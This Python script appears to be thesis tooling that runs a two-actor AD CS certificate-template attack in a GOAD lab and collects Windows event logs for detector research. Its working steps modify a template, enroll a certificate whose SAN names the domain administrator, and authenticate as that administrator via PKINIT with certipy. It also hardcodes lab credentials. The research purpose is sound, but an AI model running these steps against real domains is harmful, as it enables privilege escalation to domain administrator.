#!/usr/bin/env python3
"""
capture_trace7_split_actor_delayed_pkinit.py — Live Trace 7: Split-Actor Collusion & Delayed PKINIT
==================================================================================================
Executes Live Trace 7 against live GOAD containers (DC03 and SRV03):
1. Actor 1 (ESSOS\\khal.drogo, lowpriv) mutates CN=CGPubPositive (msPKI-Certificate-Name-Flag = 1, Event 5136).
2. Actor 2 (ESSOS\\viserys.targaryen, lowpriv) generates CSR & enrolls on CA SRV03 (Event 4886/4887).
   - Subject: CN=viserys.targaryen
   - SAN: upn=administrator@essos.local
3. Actor 1 (ESSOS\\khal.drogo) rolls back CN=CGPubPositive (msPKI-Certificate-Name-Flag = 33554432, Event 5136).
4. Delayed Authentication: Wait t_auth > t2 + 12s (strictly outside the rollback window).
5. Actor 2 (ESSOS\\viserys.targaryen) authenticates via PKINIT (Event 4768 on DC03) for administrator@essos.local.
6. Exports raw XML to thesis_research/data/live_goad_traces/trace_split_actor_delayed_pkinit.xml.
7. Updates thesis_research/data/live_goad_traces/srv03_ca_db_bridge.csv.
"""

import sys
import os
import time
import base64
import re
import pkgutil
import argparse
import csv
import hashlib
import json
from pathlib import Path
import tempfile
import xml.etree.ElementTree as ET
import subprocess

# Compatibility patch for certipy under Python 3.14
if not hasattr(pkgutil, 'ImpImporter'):
    class ImpImporter: pass
    pkgutil.ImpImporter = ImpImporter

sys.path.append('/home/m4x1d/Desktop/GOAD/.venv/lib/python3.11/site-packages')
import winrm
from cryptography.hazmat.primitives.serialization import pkcs12, NoEncryption
from cryptography.hazmat.primitives import hashes, serialization
from cryptography import x509
from certipy.entry import main as certipy_main

OUT_DIR = None  # Set to a new directory by main(); never overwrite the archive.
CAPTURE_DELAY = 14.0
DC_AUTH_IP = "127.0.0.2"
ORIGINAL_FLAG = None

# Admin sessions for setup and event log dumping
s_dc_admin = winrm.Session('http://127.0.0.1:55985/wsman', auth=('ESSOS\\vagrant', 'vagrant'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_srv_admin = winrm.Session('http://127.0.0.1:56985/wsman', auth=('ESSOS\\vagrant', 'vagrant'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)

# True low-privilege attacker sessions
s_dc_khal = winrm.Session('http://127.0.0.1:55985/wsman', auth=('khal.drogo@essos.local', 'horse'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_dc_vis = winrm.Session('http://127.0.0.1:55985/wsman', auth=('viserys.targaryen@essos.local', 'GoldCrown'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_srv_vis = winrm.Session('http://127.0.0.1:56985/wsman', auth=('viserys.targaryen@essos.local', 'GoldCrown'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)

def pull_file_winrm(session, remote_path):
    r = session.run_ps(f"[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{remote_path}'))")
    if r.status_code != 0:
        raise RuntimeError(f"Could not read expected remote artifact: {remote_path}")
    return base64.b64decode(r.std_out.decode('utf-8-sig').strip(), validate=True)

def push_file_winrm(session, data_bytes, remote_path):
    b64 = base64.b64encode(data_bytes).decode('ascii')
    session.run_cmd(f'del /f /q "{remote_path}.b64"')
    chunk_size = 500
    for i in range(0, len(b64), chunk_size):
        chunk = b64[i:i+chunk_size]
        result = session.run_cmd(f'echo {chunk}>> "{remote_path}.b64"')
        if result.status_code != 0:
            raise RuntimeError("Remote file transfer failed")
    result = session.run_cmd(f'certutil -decode "{remote_path}.b64" "{remote_path}" & del /f /q "{remote_path}.b64"')
    if result.status_code != 0 or pull_file_winrm(session, remote_path) != data_bytes:
        raise RuntimeError("Remote artifact differs from the bytes sent")


def checked_ps(session, phase, script):
    before = time.time()
    result = session.run_ps("$ErrorActionPreference='Stop'\n" + script)
    after = time.time()
    record = {"local_before": before, "local_after": after, "returncode": result.status_code,
              "stdout": result.std_out.decode('utf-8-sig', errors='replace'),
              "stderr": result.std_err.decode('utf-8-sig', errors='replace')}
    Path(OUT_DIR, phase + ".json").write_text(json.dumps(record, indent=2) + "\n")
    if result.status_code != 0:
        raise RuntimeError(f"Capture phase failed: {phase}; see its raw output")
    return result


def verify_pfx_certificate(pfx_raw, issued_bytes):
    """Reject an export of a different certificate; never select a fallback."""
    try:
        issued = x509.load_der_x509_certificate(issued_bytes)
    except ValueError:
        issued = x509.load_pem_x509_certificate(issued_bytes)
    key, certificate, extra = pkcs12.load_key_and_certificates(pfx_raw, b"Password123!")
    if key is None or certificate is None:
        raise ValueError("Expected a private key and certificate in the PFX")
    if certificate.fingerprint(hashes.SHA256()) != issued.fingerprint(hashes.SHA256()):
        raise ValueError("Exported PFX does not contain the newly issued certificate")
    public_format = serialization.PublicFormat.SubjectPublicKeyInfo
    if key.public_key().public_bytes(serialization.Encoding.DER, public_format) != certificate.public_key().public_bytes(serialization.Encoding.DER, public_format):
        raise ValueError("PFX private key does not match the issued certificate")
    return key, certificate, extra

def transfer_file_dc_to_srv(filename):
    data = pull_file_winrm(s_dc_admin, f"C:\\Shared\\{filename}")
    push_file_winrm(s_srv_admin, data, f"C:\\Shared\\{filename}")

def transfer_file_srv_to_dc(filename):
    data = pull_file_winrm(s_srv_admin, f"C:\\Shared\\{filename}")
    push_file_winrm(s_dc_admin, data, f"C:\\Shared\\{filename}")

def get_current_event_record_id(session, log_name='Security'):
    ps = f"""
    $e = Get-WinEvent -FilterHashtable @{{LogName='{log_name}'}} -MaxEvents 1 -ErrorAction SilentlyContinue
    if ($e) {{ $e.RecordId }} else {{ 0 }}
    """
    res = session.run_ps(ps)
    if res.status_code != 0:
        raise RuntimeError("Cannot establish the starting Security event boundary")
    try:
        return int(res.std_out.decode('utf-8', errors='ignore').strip())
    except ValueError as exc:
        raise RuntimeError("Invalid Security event boundary") from exc

def export_events_since(session, start_record_id, event_ids=(5136, 4886, 4887, 4768, 4769, 4624)):
    id_filter = " or ".join(f"EventID={int(i)}" for i in event_ids)
    xpath = f"*[System[(EventRecordID > {int(start_record_id)}) and ({id_filter})]]"
    ps = f"""
    $events = Get-WinEvent -LogName Security -FilterXPath '{xpath}' -ErrorAction SilentlyContinue
    if ($events) {{
        $xmls = foreach ($e in $events) {{ $e.ToXml() }}
        $xmls -join "`n"
    }} else {{
        ""
    }}
    """
    res = session.run_ps(ps)
    if res.status_code != 0:
        raise RuntimeError("Failed to export Windows Security evidence")
    return res.std_out.decode('utf-8', errors='ignore').strip()

def run_capture():
    print("=" * 80)
    print("LIVE TRACE 7: SPLIT-ACTOR COLLUSION & DELAYED PKINIT EXECUTION")
    print("=" * 80)

    # 1. Preparation
    s_dc_admin.run_cmd("if not exist C:\\Shared mkdir C:\\Shared")
    s_srv_admin.run_cmd("if not exist C:\\Shared mkdir C:\\Shared")

    dc_rec_start = get_current_event_record_id(s_dc_admin)
    srv_rec_start = get_current_event_record_id(s_srv_admin)
    print(f"[*] Initial Security Record IDs: DC03={dc_rec_start}, SRV03={srv_rec_start}")

    # ─────────────────────────────────────────────────────────────
    # STEP 1: Actor 1 (khal.drogo) mutates CN=CGPubPositive on DC03
    # ─────────────────────────────────────────────────────────────
    t1 = time.time()
    print(f"\n[1/5] [{time.strftime('%H:%M:%S')}] Actor 1 (ESSOS\\khal.drogo) mutates CN=CGPubPositive flag = 1 (Event 5136)...")
    res_mut = checked_ps(s_dc_khal, "01_mutation", """
    $nc = (Get-ADRootDSE).configurationNamingContext
    $p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
    Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 1}
    Write-Output "MUTATED"
    """)
    print("      Result:", res_mut.std_out.decode().strip())

    # ─────────────────────────────────────────────────────────────
    # STEP 2: Actor 2 (viserys.targaryen) generates CSR on DC03 & submits to SRV03
    # ─────────────────────────────────────────────────────────────
    t_req = time.time()
    print(f"\n[2/5] [{time.strftime('%H:%M:%S')}] Actor 2 (ESSOS\\viserys.targaryen) generates CSR & submits to CA SRV03 (Events 4886/4887)...")
    inf_t7 = """
$inf = @"
[NewRequest]
Subject = "CN=viserys.targaryen"
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
[Extensions]
2.5.29.17 = "{text}upn=administrator@essos.local"
[RequestAttributes]
CertificateTemplate = "CGPubPositive"
"@
[System.IO.File]::WriteAllText("C:\\Shared\\t7_split.inf", $inf)
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-new -q -f C:\\Shared\\t7_split.inf C:\\Shared\\t7_split.req" -Wait -PassThru -NoNewWindow
if ($p.ExitCode -ne 0) { throw ('CSR failed: ' + $p.ExitCode) }
Write-Output ("CSR ExitCode: " + $p.ExitCode)
"""
    res_inf = checked_ps(s_dc_vis, "02_csr", inf_t7)
    print("      CSR creation on DC03:", res_inf.std_out.decode().strip())
    transfer_file_dc_to_srv("t7_split.req")

    sub_t7 = """
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-submit -q -f -config `"braavos.essos.local\\CertGraph-Lab-CA`" C:\\Shared\\t7_split.req C:\\Shared\\t7_split.cer" -Wait -PassThru -NoNewWindow
if ($p.ExitCode -ne 0) { throw ('Submission failed: ' + $p.ExitCode) }
Write-Output ("Submit ExitCode: " + $p.ExitCode)
"""
    res_sub = checked_ps(s_srv_vis, "03_submission", sub_t7)
    print("      CA Submission on SRV03:", res_sub.std_out.decode().strip())
    transfer_file_srv_to_dc("t7_split.cer")

    # ─────────────────────────────────────────────────────────────
    # STEP 3: Actor 1 (khal.drogo) rolls back CN=CGPubPositive on DC03
    # ─────────────────────────────────────────────────────────────
    t2 = time.time()
    print(f"\n[3/5] [{time.strftime('%H:%M:%S')}] Actor 1 restores CN=CGPubPositive flag = {ORIGINAL_FLAG}...")
    res_rb = checked_ps(s_dc_khal, "04_rollback", """
    $nc = (Get-ADRootDSE).configurationNamingContext
    $p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
    Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = ORIGINAL_FLAG_TOKEN}
    Write-Output "ROLLED_BACK"
    """.replace("ORIGINAL_FLAG_TOKEN", str(ORIGINAL_FLAG)))
    print("      Result:", res_rb.std_out.decode().strip())

    # ─────────────────────────────────────────────────────────────
    # STEP 4: DELAYED WINDOW (t_auth > t2 + 12s, outside mutation window)
    # ─────────────────────────────────────────────────────────────
    delay_sec = CAPTURE_DELAY
    print(f"\n[4/5] [{time.strftime('%H:%M:%S')}] Enforcing Time-Delay Window: Waiting {delay_sec}s for rollback window to close...")
    time.sleep(delay_sec)

    # ─────────────────────────────────────────────────────────────
    # STEP 5: Actor 2 (viserys.targaryen) exports PFX & authenticates via PKINIT on DC03
    # ─────────────────────────────────────────────────────────────
    t_auth = time.time()
    print(f"\n[5/5] [{time.strftime('%H:%M:%S')}] Actor 2 (viserys.targaryen) authenticates via PKINIT on DC03 (Event 4768) at delta = {t_auth - t2:.2f}s post-rollback...")

    pfx_ps = """
    $p = Start-Process -FilePath "certreq.exe" -ArgumentList "-accept -user -q C:\\Shared\\t7_split.cer" -Wait -PassThru -NoNewWindow
    if ($p.ExitCode -ne 0) { throw ('Certificate accept failed: ' + $p.ExitCode) }
    $issued = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2('C:\\Shared\\t7_split.cer')
    $cert = Get-Item ('Cert:\\CurrentUser\\My\\' + $issued.Thumbprint) -ErrorAction Stop
    if (-not $cert.HasPrivateKey) { throw 'The exact issued certificate has no private key' }
    if ([Convert]::ToBase64String($cert.RawData) -ne [Convert]::ToBase64String($issued.RawData)) { throw 'Certificate bytes differ' }
    $pwd = ConvertTo-SecureString -String "Password123!" -Force -AsPlainText
    Export-PfxCertificate -Cert $cert -FilePath "C:\\Shared\\t7_split.pfx" -Password $pwd | Out-Null
    Write-Output "PFX_EXPORTED"
    """
    res_pfx = checked_ps(s_dc_vis, "05_exact_pfx_export", pfx_ps)
    print("      Cert accept & PFX export:", res_pfx.std_out.decode().strip())

    pfx_raw = pull_file_winrm(s_dc_admin, "C:\\Shared\\t7_split.pfx")
    issued_bytes = pull_file_winrm(s_srv_admin, "C:\\Shared\\t7_split.cer")
    Path(OUT_DIR, "issued_certificate.cer").write_bytes(issued_bytes)
    key, cert_obj, add_certs = verify_pfx_certificate(pfx_raw, issued_bytes)
    identity = {"serial": format(cert_obj.serial_number, "x"),
                "sha1_thumbprint": cert_obj.fingerprint(hashes.SHA1()).hex(),
                "sha256_fingerprint": cert_obj.fingerprint(hashes.SHA256()).hex(),
                "issuer": cert_obj.issuer.rfc4514_string()}
    Path(OUT_DIR, "certificate_identity.json").write_text(json.dumps(identity, indent=2) + "\n")
    unprotected = pkcs12.serialize_key_and_certificates(name=b"auth", key=key, cert=cert_obj, cas=add_certs, encryption_algorithm=NoEncryption())
    with tempfile.TemporaryDirectory(prefix="goad-lineage-credentials-") as private_dir:
        local_pfx = Path(private_dir, "issued.pfx")
        descriptor = os.open(local_pfx, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
        with os.fdopen(descriptor, "wb") as target:
            target.write(unprotected)
        print(f"      Executing certificate authentication against {DC_AUTH_IP}:88...")
        authentication = subprocess.run(
            [sys.executable, "-c", "from certipy.entry import main; main()", "auth", "-pfx", str(local_pfx),
             "-dc-ip", DC_AUTH_IP, "-no-hash"], cwd=private_dir,
            capture_output=True, text=True, timeout=90)
        Path(OUT_DIR, "06_certipy_authentication.json").write_text(json.dumps({
            "returncode": authentication.returncode, "stdout": authentication.stdout,
            "stderr": authentication.stderr,
            "interpretation": "Diagnostic output only; successful KDC event matching the exact certificate is required."}, indent=2) + "\n")

    time.sleep(3)

    # ─────────────────────────────────────────────────────────────
    # STEP 6: Export Telemetry & Combined XML
    # ─────────────────────────────────────────────────────────────
    print("\n[*] Exporting Windows Security event telemetry from DC03 and SRV03...")
    dc_xml = export_events_since(s_dc_admin, dc_rec_start, (5136, 4768, 4624))
    srv_xml = export_events_since(s_srv_admin, srv_rec_start, (4886, 4887))

    xml_path = os.path.join(OUT_DIR, "trace_split_actor_delayed_pkinit.xml")
    combined_events = []
    if dc_xml:
        combined_events.extend(re.findall(r'<Event[\s\S]*?</Event>', dc_xml))
    if srv_xml:
        combined_events.extend(re.findall(r'<Event[\s\S]*?</Event>', srv_xml))

    def extract_time(chunk):
        m = re.search(r'''SystemTime=["']([^"']+)["']''', chunk)
        return m.group(1) if m else ""

    combined_events.sort(key=extract_time)

    with open(xml_path, "w", encoding="utf-8") as f:
        f.write('<?xml version="1.0" encoding="utf-8"?>\n<Events>\n')
        for ev in combined_events:
            f.write(ev + "\n")
        f.write('</Events>\n')

    print(f"[+] Successfully exported {len(combined_events)} live events to: {xml_path}")

    # ─────────────────────────────────────────────────────────────
    # STEP 7: Update srv03_ca_db_bridge.csv
    # ─────────────────────────────────────────────────────────────
    print("[*] Updating CA DB cryptographic bridge from SRV03...")
    ps_bridge = """
    certutil -view -out RequestId,RequesterName,SerialNumber,CertificateHash,SubjectKeyIdentifier,CertificateTemplate,UPN,CommonName,NotBefore,NotAfter csv
    if ($LASTEXITCODE -ne 0) { throw ('CA database export failed: ' + $LASTEXITCODE) }
    """
    res_b = checked_ps(s_srv_admin, "07_ca_database_export", ps_bridge)
    raw_csv = res_b.std_out.decode('utf-8', errors='ignore')

    bridge_path = os.path.join(OUT_DIR, "srv03_ca_db_bridge.csv")
    csv_lines = [l.strip() for l in raw_csv.splitlines() if l.strip() and not l.startswith("---") and not l.startswith("Maximum") and not l.startswith("CertUtil:")]
    if csv_lines:
        with open(bridge_path, "w", encoding="utf-8") as f:
            f.write("\n".join(csv_lines) + "\n")
        print(f"[+] Successfully updated CA DB bridge ({len(csv_lines)} records) at: {bridge_path}")

    print("\n" + "=" * 80)
    print("LIVE TRACE 7 CAPTURE COMPLETE!")
    print(f"  - Mutation Actor 1:  ESSOS\\khal.drogo (t1 = {t1:.1f})")
    print(f"  - Enroller Actor 2:  ESSOS\\viserys.targaryen (t_req = {t_req:.1f})")
    print(f"  - Rollback Actor 1:  ESSOS\\khal.drogo (t2 = {t2:.1f})")
    print(f"  - Delayed Auth:      administrator@essos.local (t_auth = {t_auth:.1f}, delta = {t_auth - t2:.2f}s post-rollback)")
    print(f"  - Total Events:      {len(combined_events)} raw XML events saved")
    print("=" * 80)

    Path(OUT_DIR, "case_timeline.json").write_text(json.dumps({
        "dc_start_record_id": dc_rec_start, "ca_start_record_id": srv_rec_start,
        "mutation_start_host_time": t1, "request_host_time": t_req,
        "rollback_start_host_time": t2, "authentication_start_host_time": t_auth,
        "delay_seconds": delay_sec, "original_template_name_flag": ORIGINAL_FLAG}, indent=2) + "\n")

def adjudicate_capture(directory):
    """Anchor the case label in certificate bytes, CA issuance, and KDC outcome."""
    directory = Path(directory)
    identity = json.loads((directory / "certificate_identity.json").read_text())
    domain_raw = json.loads((directory / "00_domain_context.json").read_text())
    domain = json.loads(domain_raw["stdout"])
    expected_admin_sid = domain["domain_sid"] + "-500"

    def clean_hex(value, serial=False):
        value = "".join((value or "").split()).lower()
        return (value.lstrip("0") or "0") if serial and value else value

    with (directory / "srv03_ca_db_bridge.csv").open(newline="") as source:
        rows = list(csv.DictReader(source))
    matching_rows = [r for r in rows
                     if clean_hex(r.get("Serial Number"), True) == clean_hex(identity["serial"], True)
                     and clean_hex(r.get("Certificate Hash")) == clean_hex(identity["sha1_thumbprint"])]
    request_ids = {r["Issued Request ID"] for r in matching_rows}
    issued_events, successful_auths, failed_auths, mutations = [], [], [], []
    root = ET.parse(directory / "trace_split_actor_delayed_pkinit.xml").getroot()
    for event in root:
        system = next(c for c in event if c.tag.rsplit("}", 1)[-1] == "System")
        meta = {c.tag.rsplit("}", 1)[-1]: c.text or "" for c in system}
        fields = {c.attrib["Name"]: c.text or "" for c in event.iter()
                  if c.tag.rsplit("}", 1)[-1] == "Data" and "Name" in c.attrib}
        evidence = {"computer": meta.get("Computer"), "record_id": meta.get("EventRecordID")}
        if meta.get("EventID") == "4887" and fields.get("RequestId") in request_ids:
            issued_events.append(evidence)
        if meta.get("EventID") == "5136" and fields.get("ObjectDN", "").casefold().startswith("cn=cgpubpositive,") and fields.get("AttributeLDAPDisplayName", "").casefold() == "mspki-certificate-name-flag":
            evidence.update({"value": fields.get("AttributeValue"), "operation": fields.get("OperationType")})
            mutations.append(evidence)
        if meta.get("EventID") == "4768" and clean_hex(fields.get("CertSerialNumber"), True) == clean_hex(identity["serial"], True) and clean_hex(fields.get("CertThumbprint")) == clean_hex(identity["sha1_thumbprint"]):
            evidence.update({"status": fields.get("Status"), "preauth_type": fields.get("PreAuthType"),
                             "target": fields.get("TargetUserName"), "target_sid": fields.get("TargetSid"),
                             "target_domain": fields.get("TargetDomainName"), "issuer": fields.get("CertIssuerName")})
            is_success = fields.get("Status") in ("0", "0x0", "0x00000000")
            valid_pkinit = fields.get("PreAuthType") in ("15", "16", "17")
            target_matches = fields.get("TargetUserName", "").casefold() == "administrator"
            issuer_matches = fields.get("CertIssuerName", "").casefold() == "certgraph-lab-ca"
            sid_matches = fields.get("TargetSid") == expected_admin_sid
            domain_matches = fields.get("TargetDomainName", "").casefold() == domain["dns_root"].casefold()
            if is_success and valid_pkinit and target_matches and issuer_matches and sid_matches and domain_matches:
                successful_auths.append(evidence)
            else:
                failed_auths.append(evidence)
    timeline = json.loads((directory / "case_timeline.json").read_text())
    added_values = {m["value"] for m in mutations if m["operation"] in ("%%14674", "Value Added")}
    has_rollback_evidence = "1" in added_values and str(timeline["original_template_name_flag"]) in added_values
    return {"successful_controlled_case": len(matching_rows) == 1 and bool(issued_events) and bool(successful_auths) and has_rollback_evidence,
            "certificate_identity": identity, "matching_ca_database_rows": len(matching_rows),
            "matching_ca_issuance_events": issued_events, "matching_successful_kdc_events": successful_auths,
            "other_matching_kdc_events": failed_auths,
            "template_mutation_events": mutations, "rollback_evidence_present": has_rollback_evidence,
            "label_scope": "Certificate-byte-anchored controlled lab outcome, separate from detector output; not independently adjudicated field data."}


def main():
    global OUT_DIR, CAPTURE_DELAY, DC_AUTH_IP, ORIGINAL_FLAG
    global s_dc_admin, s_srv_admin, s_dc_khal, s_dc_vis, s_srv_vis
    parser = argparse.ArgumentParser(description="Capture a new, outcome-checked split-actor case without overwriting archived traces")
    parser.add_argument("--output-dir", type=Path, required=True)
    parser.add_argument("--dc-url", default="http://127.0.0.1:55985/wsman")
    parser.add_argument("--ca-url", default="http://127.0.0.1:56985/wsman")
    parser.add_argument("--dc-ip", default="127.0.0.2", help="Address with a real TCP/88 forwarding path to this test DC")
    parser.add_argument("--delay", type=float, default=14.0)
    args = parser.parse_args()
    if not 0 <= args.delay <= 60:
        parser.error("Use a delay between zero and 60 seconds")
    args.output_dir.mkdir(parents=True, exist_ok=False)
    OUT_DIR = str(args.output_dir.resolve())
    CAPTURE_DELAY, DC_AUTH_IP = args.delay, args.dc_ip

    def session(url, user, password):
        return winrm.Session(url, auth=(user, password), transport="ntlm", read_timeout_sec=60, operation_timeout_sec=50)

    admin_user = os.environ.get("GOAD_LAB_USER", "ESSOS\\vagrant")
    admin_password = os.environ.get("GOAD_LAB_PASSWORD", "vagrant")
    s_dc_admin = session(args.dc_url, os.environ.get("GOAD_DC_USER", admin_user), os.environ.get("GOAD_DC_PASSWORD", admin_password))
    s_srv_admin = session(args.ca_url, os.environ.get("GOAD_CA_USER", admin_user), os.environ.get("GOAD_CA_PASSWORD", admin_password))
    s_dc_khal = session(args.dc_url, "khal.drogo@essos.local", os.environ.get("GOAD_KHAL_PASSWORD", "horse"))
    s_dc_vis = session(args.dc_url, "viserys.targaryen@essos.local", os.environ.get("GOAD_VISERYS_PASSWORD", "GoldCrown"))
    s_srv_vis = session(args.ca_url, "viserys.targaryen@essos.local", os.environ.get("GOAD_VISERYS_PASSWORD", "GoldCrown"))
    status = {"status": "started", "source_sha256": hashlib.sha256(Path(__file__).read_bytes()).hexdigest(),
              "python": sys.version.split()[0], "delay_seconds": CAPTURE_DELAY}
    error = None
    try:
        checked_ps(s_dc_admin, "00_domain_context", """
        $domain = Get-ADDomain
        [ordered]@{domain_sid=$domain.DomainSID.Value;dns_root=$domain.DNSRoot;dc_name=$env:COMPUTERNAME;os_build=(Get-CimInstance Win32_OperatingSystem).BuildNumber}|ConvertTo-Json -Compress
        """)
        original = checked_ps(s_dc_admin, "00_original_template_state", """
        $nc = (Get-ADRootDSE).configurationNamingContext
        $p = 'CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,' + $nc
        (Get-ADObject $p -Properties msPKI-Certificate-Name-Flag).'msPKI-Certificate-Name-Flag'
        """)
        ORIGINAL_FLAG = int(original.std_out.decode('utf-8-sig').strip())
        if ORIGINAL_FLAG & 1:
            raise RuntimeError("The initial template already permits enrollee-supplied subjects; this is not an enabling-change case")
        run_capture()
        judgement = adjudicate_capture(OUT_DIR)
        Path(OUT_DIR, "adjudication.json").write_text(json.dumps(judgement, indent=2) + "\n")
        if not judgement["successful_controlled_case"]:
            raise RuntimeError("The exact new certificate lacks a matched CA issuance and successful KDC outcome; the capture is not a successful attack case")
        status["status"] = "outcome_checked_capture"
    except Exception as exc:
        error = exc
        status.update({"status": "failed_capture", "error_type": type(exc).__name__, "error": str(exc)})
    finally:
        if ORIGINAL_FLAG is not None:
            try:
                checked_ps(s_dc_admin, "99_restore_original_state", """
                $nc = (Get-ADRootDSE).configurationNamingContext
                $p = 'CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,' + $nc
                Set-ADObject $p -Replace @{'msPKI-Certificate-Name-Flag'=ORIGINAL_FLAG_TOKEN}
                $actual=(Get-ADObject $p -Properties msPKI-Certificate-Name-Flag).'msPKI-Certificate-Name-Flag'
                if ($actual -ne ORIGINAL_FLAG_TOKEN) { throw 'Template restoration did not verify' }
                Remove-Item 'C:\\Shared\\t7_split.pfx' -Force -ErrorAction SilentlyContinue
                Write-Output ('RESTORED:' + $actual)
                """.replace("ORIGINAL_FLAG_TOKEN", str(ORIGINAL_FLAG)))
                status["original_state_restored"] = True
            except Exception as restore_error:
                status["original_state_restored"] = False
                status["restoration_error"] = str(restore_error)
                if error is None:
                    error = restore_error
                status["status"] = "failed_capture"
        status["output_sha256"] = {p.name: hashlib.sha256(p.read_bytes()).hexdigest()
                                   for p in sorted(Path(OUT_DIR).iterdir()) if p.is_file() and p.name != "capture_manifest.json"}
        Path(OUT_DIR, "capture_manifest.json").write_text(json.dumps(status, indent=2) + "\n")
    if error is not None:
        raise RuntimeError(f"Capture failed; review {OUT_DIR}/capture_manifest.json") from error
    print(f"Outcome-checked capture saved to {OUT_DIR}")


if __name__ == "__main__":
    main()
